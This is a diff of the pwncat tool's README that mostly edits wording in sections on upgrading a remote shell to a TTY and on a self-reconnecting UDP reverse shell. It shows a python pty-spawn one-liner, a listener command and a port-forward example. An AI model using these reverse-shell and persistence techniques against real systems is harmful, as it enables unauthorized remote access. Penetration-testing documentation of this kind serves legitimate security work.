@@ -113,8 +113,10 @@ pwncat -R 127.0.0.1:3306 example.com 4444
 
 ## :dizzy: Upgrade your shell
 
-When connected to a remote or bind shell you'll notice that no interactive commands will work and
-accidentally hitting <kbd>Ctrl</kbd>+<kbd>c</kbd> will terminate your connection.
+> This is a general advice and not only works with `pwncat`, but with all common tools.
+
+When connected with a reverse or bind shell you'll notice that no interactive commands will work and
+hitting <kbd>Ctrl</kbd>+<kbd>c</kbd> will terminate your session.
 To fix this, you'll need to attach it to a TTY. Here's how:
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -264,7 +266,7 @@ Find below some more detailed and advanced examples.
 
 
 ### Unbreakable UDP reverse shell
-Why unbreakable? Because it will keep coming to you, also if you kill your listening server.
+Why unbreakable? Because it will keep coming to you, even if you kill your listening server temporarily.
 ```bash
 # The client
 # --exec            # Provide this executable
@@ -293,7 +295,7 @@ your server and start it again in silent mode:
 pwncat -u -l -vvvvv
 ```
 Now wait a maximum of 10 seconds and you can issue commands.
-Having no info messages at all, are also troublesome. You might also want to know what is going
+Having no info messages at all, is also troublesome. You might want to know what is going
 on behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect
 the notifications to a logfile:
 ```bash
